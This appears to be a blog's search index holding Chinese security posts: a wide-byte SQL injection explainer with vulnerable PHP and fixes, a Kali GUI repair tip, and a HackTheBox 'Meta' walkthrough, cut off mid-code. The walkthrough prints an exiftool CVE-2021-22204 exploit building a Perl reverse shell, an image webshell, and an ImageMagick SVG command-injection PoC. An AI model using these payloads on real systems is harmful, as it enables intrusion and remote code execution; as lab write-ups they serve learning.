<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>宽字节注入</title>
    <link href="/2022/04/24/%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/"/>
    <url>/2022/04/24/%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<p>宽字节注入主要是由于MySQL数据库与客户端（这里以PHP为例）转义编码格式不同，导致SQL在数据库进行编码转换时可能出现编码问题引起的。</p><p>常见单字节编码有ASCII、latin1，常见宽字节（多字节）编码有GBK、UTF-8。</p><p>常见转义函数与配置：<a href="https://www.php.net/manual/zh/function.addslashes.php">addslashes()</a>、 <a href="https://www.php.net/manual/zh/function.mysql-real-escape-string.php">mysql_real_escape_string()</a> 、<a href="https://www.php.net/manual/zh/function.mysql-escape-string.php">mysql_escape_string()</a>（本函数和 mysql_real_escape_string 完全一样，除了 mysql_real_escape_string接受的是一个连接句柄并根据当前字符集转移字符串之外。mysql_escape_string() 并不接受连接参数，也不管当前字符集设定。）、php.ini中 <a href="https://www.php.net/manual/zh/info.configuration.php#ini.magic-quotes-gpc">magic_quotes_gpc</a> 指令（<code>在php5.4已上已给删除</code>，并且需要说明特别说明一点，GPC无法过滤<code>$_SERVER</code>提交的参数）。</p><!--  more --><h3 id="0x01-MySQL交互过程"><a href="#0x01-MySQL交互过程" class="headerlink" title="0x01 MySQL交互过程"></a>0x01 MySQL交互过程</h3><p>在MySQL数据库中，各字符集查询<code>show variables like &quot;%character%&quot;;</code></p><p><img src="https://cdn.jsdelivr.net/gh/Dar3n1y/cdn-images@latest/blog-images/2022/04/26/20220426-1202.png"></p><p>简单的交互过程：</p><ol><li><p>SQL以客户端编码格式发送到数据库连接层。</p></li><li><p>将收到的SQL转为连接层字符集（通过系统变量character_set_client 对 SQL 语句进行解码后，然后使用系统变量character_set_connection对解码后的十六进制进行编码）。</p></li><li><p>内部操作前，将数据按照（字段 CHARACTER SET 设定值&gt;对应数据表默认编码&gt;对应数据库默认编码&gt;character_set_server）顺序转化成内部操作字符集进行解码。</p></li><li><p>执行SQL后，通过character_set_results 编码进行输出。</p></li></ol><h3 id="0x02-注入原理"><a href="#0x02-注入原理" class="headerlink" title="0x02 注入原理"></a>0x02 注入原理</h3><p>宽字节注入通常利用原理指的是 MySQL 数据库在使用宽字节（GBK）编码（或单独设置set names “gbk”、SET character_set_client &#x3D;gbk）时，会认为两个字节是一个汉字（首字节ascii码要大于128（比如%df），才到汉字的范围），而且当我们输入单引号时，代码会调用转义函数，将单引号变为\&#39;，其中\的十六进制URL编码是%5c，GBK编码下的MySQL会认为%df%5c是一个宽字节，也就是’運’，从而使单引号闭合（逃逸），进行注入攻击。</p><p>其次，MySQL数据库在使用UTF-8宽字节编码时，使用函数转义，并使用iconv函数进行编码转换情况下也可能造成宽字节注入，下面实例二会简单介绍。</p><h3 id="0x03-注入实例"><a href="#0x03-注入实例" class="headerlink" title="0x03 注入实例"></a>0x03 注入实例</h3><h4 id="实例一"><a href="#实例一" class="headerlink" title="实例一"></a>实例一</h4><p>这里通过Sqli-labs中的Less-33来简单实践下，直接代码分析，比较简单。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check_addslashes</span>(<span class="hljs-params"><span class="hljs-variable">$string</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$string</span>= <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$string</span>);    <br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$string</span>;<br>&#125;<br><br><span class="hljs-comment">// take the variables </span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>]))<br>&#123;<br><span class="hljs-variable">$id</span>=<span class="hljs-title function_ invoke__">check_addslashes</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>]);<br><span class="hljs-comment">//echo &quot;The filtered request is :&quot; .$id . &quot;&lt;br&gt;&quot;;</span><br><br><span class="hljs-comment">//logging the connection parameters to a file for analysis.</span><br><span class="hljs-variable">$fp</span>=<span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&#x27;result.txt&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>);<br><span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$fp</span>,<span class="hljs-string">&#x27;ID:&#x27;</span>.<span class="hljs-variable">$id</span>.<span class="hljs-string">&quot;\n&quot;</span>);<br><span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$fp</span>);<br><br><span class="hljs-comment">// connectivity </span><br><br><span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-string">&quot;SET NAMES gbk&quot;</span>);<span class="hljs-comment">//设置mysql编码格式为gbk</span><br><span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="hljs-subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;<br><span class="hljs-variable">$result</span>=<span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>);<br><span class="hljs-variable">$row</span> = <span class="hljs-title function_ invoke__">mysql_fetch_array</span>(<span class="hljs-variable">$result</span>);<br></code></pre></td></tr></table></figure><p>当数据库编码设置为gbk时，id参数提交<code>1%df&#39;</code>，通过url编码为<code>1%df%27</code>，经过函数check_addslashes()对特殊字符%27进行转义为<code>1%df%5c%27</code>，然后设置MySQL编码为gbk，经过数据库内部操作转码后，最终以<code>1運&#39;</code>查询。</p><p>数据变化：<code>%df%27--&gt;(\转义函数处理)--&gt;%df%5c%27--&gt;(GBK编码)--&gt;運&#39;</code></p><p>一个在线转码地址：<a href="https://www.atool99.com/urlencode.php">https://www.atool99.com/urlencode.php</a></p><p>解释下页面为什么<code>運字符</code>是乱码<code>(?\&#39;)</code>，是因为HTML页面显示的UTF-8编码，把页面改成charset&#x3D;gbk就好。</p><p><img src="https://cdn.jsdelivr.net/gh/Dar3n1y/cdn-images@latest/blog-images/2022/04/26/20220426-1202-1.png"></p><h4 id="实例二"><a href="#实例二" class="headerlink" title="实例二"></a>实例二</h4><p>当数据库编码为uft-8时，在使用iconv()函数处理数据前先进行addslashes()转义也会引起宽字节注入，当然和GBK编码还有着千丝万缕 的关系。</p><p>iconv()函数一般用来为了避免乱码，会将一些用户提交的GBK字符使用该函数先转为UTF-8，然后再拼接入SQL语句。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check_addslashes</span>(<span class="hljs-params"><span class="hljs-variable">$string</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$string</span>= <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$string</span>);    <br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$string</span>;<br>&#125;<br><br><span class="hljs-comment">// take the variables </span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>]))<span class="hljs-comment">//id = %e5%5c%27</span><br>&#123;<br><span class="hljs-variable">$id</span>=<span class="hljs-title function_ invoke__">check_addslashes</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>]); <span class="hljs-comment">// id = %e5%5c%5c%5c%27</span><br><span class="hljs-variable">$id</span> = <span class="hljs-title function_ invoke__">iconv</span>(<span class="hljs-string">&#x27;GBK&#x27;</span>,<span class="hljs-string">&#x27;UTF-8&#x27;</span>,<span class="hljs-variable">$id</span>); <span class="hljs-comment">//把参数中的gbk字符转换成uft-8 id = %e9%8c%a6%5c%5c%27</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;The filtered request is :&quot;</span> .<span class="hljs-variable">$id</span> . <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br><br><span class="hljs-comment">//logging the connection parameters to a file for analysis.</span><br><span class="hljs-variable">$fp</span>=<span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&#x27;result.txt&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>);<br><span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$fp</span>,<span class="hljs-string">&#x27;ID:&#x27;</span>.<span class="hljs-variable">$id</span>.<span class="hljs-string">&quot;\n&quot;</span>);<br><span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$fp</span>);<br><br><span class="hljs-comment">// connectivity </span><br><br><span class="hljs-comment">//mysql_query(&quot;SET NAMES gbk&quot;);</span><br><span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-string">&quot;SET NAMES UTF-8&quot;</span>);<span class="hljs-comment">//设置成utf-8</span><br><span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="hljs-subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;<br><span class="hljs-comment">//echo $sql;</span><br><span class="hljs-variable">$result</span>=<span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>);<br><span class="hljs-variable">$row</span> = <span class="hljs-title function_ invoke__">mysql_fetch_array</span>(<span class="hljs-variable">$result</span>);<br></code></pre></td></tr></table></figure><p>数据变化：<code>%e5%5c%27----&gt;(addslashes)----&gt;%e5%5c%5c%5c%27----(iconv)----&gt;%e9%8c%a6%5c%5c%27</code></p><p>最后可以看见%e9%8c%a6变为錦，%5c被%5c转义，而%27被单出来了。</p><p><img src="https://cdn.jsdelivr.net/gh/Dar3n1y/cdn-images@latest/blog-images/2022/04/26/20220426-1205.png"></p><h3 id="0x04-修复建议"><a href="#0x04-修复建议" class="headerlink" title="0x04 修复建议"></a>0x04 修复建议</h3><p>一、同时使用UTF-8编码，并且不使用iconv()函数。</p><p>二、使用mysql_set_charset(“GBK”);指定字符集&amp;&amp;使用mysql_real_escape_string()函数进行转义。</p><p><img src="https://cdn.jsdelivr.net/gh/Dar3n1y/cdn-images@latest/blog-images/2022/04/26/20220426-1206.png"></p><h3 id="0x05-参考链接"><a href="#0x05-参考链接" class="headerlink" title="0x05 参考链接"></a>0x05 参考链接</h3><p><a href="https://blog.csdn.net/weixin_45441315/article/details/119483135">https://blog.csdn.net/weixin_45441315/article/details/119483135</a></p><p><a href="https://www.cnblogs.com/cscshi/p/15705038.html">https://www.cnblogs.com/cscshi/p/15705038.html</a></p><p><a href="https://xz.aliyun.com/t/1719">https://xz.aliyun.com/t/1719</a></p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Sql注入</tag>
      
      <tag>漏洞原理</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Kali重启无图形GUI解决方法</title>
    <link href="/2022/03/05/Kali%E9%87%8D%E5%90%AF%E6%97%A0%E5%9B%BE%E5%BD%A2GUI%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/"/>
    <url>/2022/03/05/Kali%E9%87%8D%E5%90%AF%E6%97%A0%E5%9B%BE%E5%BD%A2GUI%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<blockquote><p>一次打靶机的过程中重启PD，打开Kali没有GUI界面（M1）</p></blockquote><span id="more"></span><h3 id="0x01-解决方法"><a href="#0x01-解决方法" class="headerlink" title="0x01 解决方法"></a>0x01 解决方法</h3><p>​用自己的账户密码登录cli，重新安装图形化界面（我也不知道为什么就要重新安装了，毕竟我前面没卸载啊。。。</p><p>依次输入：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">apt update</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">apt install x-window-system-core</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">apt install gnome-core</span><br></code></pre></td></tr></table></figure><p>注：<strong>如果有换了apt源的话，可能会安装不成功，把你备份的官方源还原下就可以了</strong></p><h3 id="0x02-成功恢复"><a href="#0x02-成功恢复" class="headerlink" title="0x02 成功恢复"></a>0x02 成功恢复</h3><p><img src="https://cdn.jsdelivr.net/gh/Dar3n1y/cdn-images@master/blog-images/2022/03/06/20220306-0016-6.png" alt="image-20220305202031959"></p>]]></content>
    
    
    <categories>
      
      <category>疑难杂症</category>
      
    </categories>
    
    
    <tags>
      
      <tag>解决办法</tag>
      
      <tag>杂项</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HackTheBox-Meta</title>
    <link href="/2022/03/05/HackTheBox-Meta/"/>
    <url>/2022/03/05/HackTheBox-Meta/</url>
    
    <content type="html"><![CDATA[<blockquote><p>HackThebox是国外的一款靶场渗透在线平台，本文详细记录了Meta靶场渗透测试的过程，难度较难，其中包含了CVE-2021-22204-exiftool、ImageMgick命令注入、提权等内容。</p></blockquote><span id="more"></span><h3 id="0x01-Meta"><a href="#0x01-Meta" class="headerlink" title="0x01 Meta"></a>0x01 Meta</h3><p><img src="https://cdn.jsdelivr.net/gh/Dar3n1y/cdn-images@latest/blog-images/2022/04/17/20220417-2323.png" alt="image"></p><h3 id="0x02-信息搜集"><a href="#0x02-信息搜集" class="headerlink" title="0x02 信息搜集"></a>0x02 信息搜集</h3><p>神器nmap扫描常用端口</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns">nmap -<span class="hljs-keyword">A</span> -sV <span class="hljs-number">10.10.11.140</span>  <br></code></pre></td></tr></table></figure><p>从扫描结果看出开放了22和80端口</p><p><img src="https://cdn.jsdelivr.net/gh/Dar3n1y/cdn-images@latest/blog-images/2022/04/17/20220417-0131-2.png" alt="image"></p><p>访问80端口，发现重定向一个网址名为artcorp.htb的网址，修改hosts文件绑定域名，可见是一个简单的门户网站</p><p><img src="https://cdn.jsdelivr.net/gh/Dar3n1y/cdn-images@latest/blog-images/2022/04/17/20220417-0131-3.png" alt="image"></p><p>发现该网站没有其他功能入口，w-w 顺手拿起大佬的脚本跑一边站点目录，看有没有好东西</p><p><img src="https://cdn.jsdelivr.net/gh/Dar3n1y/cdn-images@latest/blog-images/2022/04/17/20220417-0131-4.png" alt="image"></p><p>嗯。。。无，再跑下子域名</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">ffuf -c -w <span class="hljs-string">&#x27;/media/psf/Home/Data/Dict/SecLists/Discovery/DNS/subdomains-top1million-5000.txt&#x27;</span> -u http:<span class="hljs-regexp">//</span>artcorp.htb/ -H <span class="hljs-string">&quot;Host: FUZZ.artcorp.htb&quot;</span> -mc <span class="hljs-number">200</span> <br></code></pre></td></tr></table></figure><p>发现存在dev01.artcorp.htb子域名</p><p><img src="https://cdn.jsdelivr.net/gh/Dar3n1y/cdn-images@latest/blog-images/2022/04/17/20220417-0131-5.png" alt="image"></p><p>在hosts中绑定子域名，访问域名有东西，是一个开发测试的环境</p><p><img src="https://cdn.jsdelivr.net/gh/Dar3n1y/cdn-images@latest/blog-images/2022/04/17/20220417-0131-6.png" alt="image"></p><p>点击MetaView，发现一个文件上传的功能点Upload</p><p><img src="https://cdn.jsdelivr.net/gh/Dar3n1y/cdn-images@latest/blog-images/2022/04/17/20220417-0131-7.png" alt="image"></p><p>我们可以知道这是一个php的站点，先直接上传一个后缀为php的木马，提示不被允许</p><p><img src="https://cdn.jsdelivr.net/gh/Dar3n1y/cdn-images@latest/blog-images/2022/04/17/20220417-0131-8.png" alt="image"></p><p>通过简单测试发现系统应该是校验了上传文件的头字节来判断是否是允许的图片格式</p><p>直接制作图片马</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">cat <span class="hljs-number">123</span><span class="hljs-selector-class">.jpeg</span> eval<span class="hljs-selector-class">.php</span> &gt; eval123.php<br></code></pre></td></tr></table></figure><p>再次上传成功</p><p><img src="https://cdn.jsdelivr.net/gh/Dar3n1y/cdn-images@latest/blog-images/2022/04/17/20220417-0131-9.png" alt="image"></p><p>这里找了没有上传文件保存路径，随便测了几个常规文件保存路径，无果放弃！（应该在早点注意这个条件的，扎心了…）</p><p>回到上传成功的页面，查看图片列出的属性信息格式，搜索发现这是一个exiftool的cve漏洞</p><p><img src="https://cdn.jsdelivr.net/gh/Dar3n1y/cdn-images@latest/blog-images/2022/04/17/20220417-0131-10.png" alt="image"></p><p>上传图片返回的图片属性</p><p><img src="https://cdn.jsdelivr.net/gh/Dar3n1y/cdn-images@latest/blog-images/2022/04/17/20220417-0131-11.png" alt="image"></p><p>（做到这里突然Kali直接无界面了，怎么重启都一样，卡了很久，还有网上搜索姿势要对，废了好长时间才找到了大佬的解决办法！！！）</p><p>继续……</p><h3 id="0x03-漏洞利用"><a href="#0x03-漏洞利用" class="headerlink" title="0x03 漏洞利用"></a>0x03 漏洞利用</h3><p>​<strong>ExifTool 7.44至12.23在DjVu模块中存在一个错误，该错误允许在解析恶意图像时执行任意代码</strong></p><blockquote><p>Exp</p><p><a href="https://github.com/OneSecCyber/JPEG_RCE">https://github.com/OneSecCyber/JPEG_RCE</a></p><p><a href="https://github.com/convisolabs/CVE-2021-22204-exiftool">https://github.com/convisolabs/CVE-2021-22204-exiftool</a></p></blockquote><blockquote><p><a href="https://blog.convisoappsec.com/en/a-case-study-on-cve-2021-22204-exiftool-rce/">https://blog.convisoappsec.com/en/a-case-study-on-cve-2021-22204-exiftool-rce/</a></p></blockquote><p>把第二个链接下载下来,更改exploit.py中的地址和端口</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/bin/env python3</span><br><br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> subprocess<br><br>ip = <span class="hljs-string">&#x27;10.10.11.17&#x27;</span> //修改成自己的地址<br>port = <span class="hljs-string">&#x27;9090&#x27;</span>//准备监听的端口<br><br>payload = <span class="hljs-string">b&quot;(metadata \&quot;\c$&#123;use MIME::Base64;eval(decode_base64(&#x27;&quot;</span><br><br><br>payload = payload + base64.b64encode( <span class="hljs-string">f&quot;use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&#x27;tcp&#x27;));if(connect(S,sockaddr_in(<span class="hljs-subst">&#123;port&#125;</span>,inet_aton(&#x27;<span class="hljs-subst">&#123;ip&#125;</span>&#x27;))))&#123;&#123;open(STDIN,&#x27;&gt;&amp;S&#x27;);open(STDOUT,&#x27;&gt;&amp;S&#x27;);open(STDERR,&#x27;&gt;&amp;S&#x27;);exec(&#x27;/bin/sh -i&#x27;);&#125;&#125;;&quot;</span>.encode() )<br><br>payload = payload + <span class="hljs-string">b&quot;&#x27;))&#125;;\&quot;)&quot;</span><br><br><br>payload_file = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;payload&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>)<br>payload_file.write(payload.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br>payload_file.close()<br><br><br>subprocess.run([<span class="hljs-string">&#x27;bzz&#x27;</span>, <span class="hljs-string">&#x27;payload&#x27;</span>, <span class="hljs-string">&#x27;payload.bzz&#x27;</span>])<br>subprocess.run([<span class="hljs-string">&#x27;djvumake&#x27;</span>, <span class="hljs-string">&#x27;exploit.djvu&#x27;</span>, <span class="hljs-string">&quot;INFO=1,1&quot;</span>, <span class="hljs-string">&#x27;BGjp=/dev/null&#x27;</span>, <span class="hljs-string">&#x27;ANTz=payload.bzz&#x27;</span>])<br>subprocess.run([<span class="hljs-string">&#x27;exiftool&#x27;</span>, <span class="hljs-string">&#x27;-config&#x27;</span>, <span class="hljs-string">&#x27;configfile&#x27;</span>, <span class="hljs-string">&#x27;-HasselbladExif&lt;=exploit.djvu&#x27;</span>, <span class="hljs-string">&#x27;image.jpg&#x27;</span>]) <br></code></pre></td></tr></table></figure><p>执行exploit.py脚本生成 payload图片</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">python3 exploit.py<br></code></pre></td></tr></table></figure><p>(这里需要提前 <strong>sudo apt install djvulibre-bin exiftool</strong>)</p><p><img src="https://cdn.jsdelivr.net/gh/Dar3n1y/cdn-images@latest/blog-images/2022/04/17/20220417-0131-12.png" alt="image"></p><p>然后再开一个终端 使用nc监听9090 </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">nc -lvvp 9090<br></code></pre></td></tr></table></figure><p>上传新生成的image.jpg </p><p><img src="https://cdn.jsdelivr.net/gh/Dar3n1y/cdn-images@latest/blog-images/2022/04/17/20220417-0131-13.png" alt="image"></p><p>可以发现shell回连成功</p><p><img src="https://cdn.jsdelivr.net/gh/Dar3n1y/cdn-images@latest/blog-images/2022/04/17/20220417-0131-14.png" alt="image"></p><p>简单查看系统信息(是一个www-data用户)</p><p><img src="https://cdn.jsdelivr.net/gh/Dar3n1y/cdn-images@latest/blog-images/2022/04/17/20220417-0131-15.png" alt="image"></p><h3 id="0x04-权限提升"><a href="#0x04-权限提升" class="headerlink" title="0x04 权限提升"></a>0x04 权限提升</h3><p>查看&#x2F;etc&#x2F;passwd中可登录的用户</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cat</span> /etc/passwd | grep /bin/bash</span><br>root:x:0:0:root:/root:/bin/bash<br>thomas:x:1000:1000:thomas,,,:/home/thomas:/bin/bash<br></code></pre></td></tr></table></figure><h5 id="User-thomas"><a href="#User-thomas" class="headerlink" title="User (thomas)"></a>User (thomas)</h5><p>​目的是为了拿到&#x2F;home&#x2F;thomas&#x2F;user.txt中的flag</p><p>切换&#x2F;bin&#x2F;bash</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">python3 -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Dar3n1y/cdn-images@latest/blog-images/2022/04/17/20220417-0131-16.png" alt="image"></p><p>发现User用户下存在.ssh,但是无权限查看</p><p>查看从时间2022-01-01以来创建的新文件,找到一个脚本文件(参考的大佬的思路,这个不好找啊,另外一种就是上传<a href="https://github.com/DominicBreuker/pspy/releases/tag/v1.2.0">pspy小工具</a>)</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">www-data@meta:/home/thomas$ find /usr/ -type f -newermt &#x27;2022-01-01&#x27; -ls<br>find /usr/ -type f -newermt &#x27;2022-01-01&#x27; -ls<br>   152500      4 -rwxr-xr-x   1 root     root          126 Jan  3 10:13 /usr/local/bin/convert_images.sh<br></code></pre></td></tr></table></figure><p>查看文件内容</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">www-data@meta:/usr/local/bin$ cat convert_images.sh<br>cat convert_images.sh<br><span class="hljs-meta prompt_">#</span><span class="language-bash">!/bin/bash</span><br>cd /var/www/dev01.artcorp.htb/convert_images/ &amp;&amp; /usr/local/bin/mogrify -format png *.* 2&gt;/dev/null<br>pkill mogrify<br></code></pre></td></tr></table></figure><p>里面的代码逻辑是 进入一个目录下,执行mogrify命令把该目录下发现的文件转换成png,最后杀死进程(<strong>imagemagick的mogrify用来批处理照片的脚本</strong>)</p><p>查看该命令版本</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell">www-data@meta:/usr/local/bin$ mogrify -version<br>mogrify -version<br>Version: ImageMagick 7.0.10-36 Q16 x86_64 2021-08-29 https://imagemagick.org<br>Copyright: © 1999-2020 ImageMagick Studio LLC<br>License: https://imagemagick.org/script/license.php<br>Features: Cipher DPC HDRI OpenMP(4.5) <br>Delegates (built-in): fontconfig freetype jng jpeg png x xml zlib<br></code></pre></td></tr></table></figure><blockquote><p><a href="https://insert-script.blogspot.com/2020/11/imagemagick-shell-injection-via-pdf.html">https://insert-script.blogspot.com/2020/11/imagemagick-shell-injection-via-pdf.html</a> </p><p><a href="https://imagetragick.com/">https://imagetragick.com/</a></p></blockquote><p>最好是通过上传一个poc.svg到&#x2F;etc&#x2F;shm下(这里我比较废,试了直接在shell里面vi写无法保存——shell太烂了,试了echo写无权限,试了scp连不上本机,最后通过wget下载的^_^早干嘛去了……)</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs xml">#poc.svg<br><span class="hljs-tag">&lt;<span class="hljs-name">image</span> <span class="hljs-attr">authenticate</span>=<span class="hljs-string">&#x27;ff&quot; `echo $(id)&gt; /dev/shm/0wned`;&quot;&#x27;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">read</span> <span class="hljs-attr">filename</span>=<span class="hljs-string">&quot;pdf:/etc/passwd&quot;</span>/&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">get</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;base-width&quot;</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;base-height&quot;</span> /&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">resize</span> <span class="hljs-attr">geometry</span>=<span class="hljs-string">&quot;400x400&quot;</span> /&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">write</span> <span class="hljs-attr">filename</span>=<span class="hljs-string">&quot;test.png&quot;</span> /&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">svg</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;700&quot;</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;700&quot;</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://www.w3.org/2000/svg&quot;</span> <span class="hljs-attr">xmlns:xlink</span>=<span class="hljs-string">&quot;http://www.w3.org/1999/xlink&quot;</span>&gt;</span>       <br>  <span class="hljs-tag">&lt;<span class="hljs-name">image</span> <span class="hljs-attr">xlink:href</span>=<span class="hljs-string">&quot;msl:poc.svg&quot;</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;100&quot;</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;100&quot;</span>/&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">svg</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">image</span>&gt;</span><br></code></pre></td></tr></table></figure><p>然后把poc.svg复制到&#x2F;var&#x2F;www&#x2F;dev01.artcorp.htb&#x2F;convert_images&#x2F;这个目录下,过些许时间就生成了</p><p>&#x2F;dev&#x2F;shm&#x2F;0wned文件,尝试是否有权限查看文件(可以查看就是成功了)</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 